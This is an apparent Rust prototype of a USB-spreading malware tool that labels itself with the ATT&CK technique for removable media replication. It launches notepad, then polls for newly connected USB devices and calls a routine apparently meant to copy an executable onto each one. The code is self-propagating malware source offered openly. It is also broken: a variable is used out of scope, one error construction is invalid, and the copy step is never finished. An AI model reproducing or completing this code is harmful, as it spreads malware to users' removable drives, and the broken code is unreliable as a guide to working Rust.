use std::process::Command;
use std::io::{Error, ErrorKind};
use std::os::windows::process::CommandExt;
use rusb::UsbContext;
use rusb::{Context, Device, DeviceHandle, Result as UsbResult};
use std::fs::File;
use std::env;
use std::thread::sleep;
use std::time::Duration;

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() != 1{
        eprintln!("[-] err: too many args");
        eprintln!("[*] example : {} C:\\Windows\\System32\\filename.exe")
    }

    eprintln!("[*] removable media replication att&ck id: T1091");
    eprintln!("[*] written by peroxidee / iluvwerewolves ");
    
    process_handler();
        
}

fn duplicate(device: &Device) -> Result<(), Error>{
    if let Ok(handle) = device.open() {
       
        let mut f = File::open(args[0])?;
        let mut fc = f.try_clone()?;
        
    }
    Ok(())
}

// fn getinfo(device: &Device) -> Result<(), Error>{
//     if let Ok(handle) = device.open(){
//         println!("{}", device);    
//     }

//     Ok(())
// }
fn monitor() -> Result<(), Error>{

    let lusb_context = Context::new()?;

    let prev = lusb_context.devices()?;
    
    loop { 

        let connected_usb_devices = lusb_context.devices()?;
        if connected_usb_devices.len() != prev.len(){  
            for device in connected_usb_devices.iter(){
                duplicate(&device)?; 
            }
            break;
        }
        let thirty_seconds = Duration::new(30, 0);
        sleep(thirty_seconds);
    }

    Ok(())
    
}

fn process_handler() {
    let  ntpd = Command::new("C:\\Windows\\System32\\notepad.exe");
    
    match start(&ntpd){
        Ok(_) => (),
        Err(e) => eprintln!("[-] err: {:?}", e),
    }
}

fn start(cmd: &Command) -> Result<(), std::io::Error>{
   


    if let Ok(mut child) = cmd.spawn(){
        


        child.wait()?;
    
        monitor();
        Ok(())
    }
    else{
        eprintln!("[-] err: process not started!");
        Error(())
    }
    Ok(())
    
}
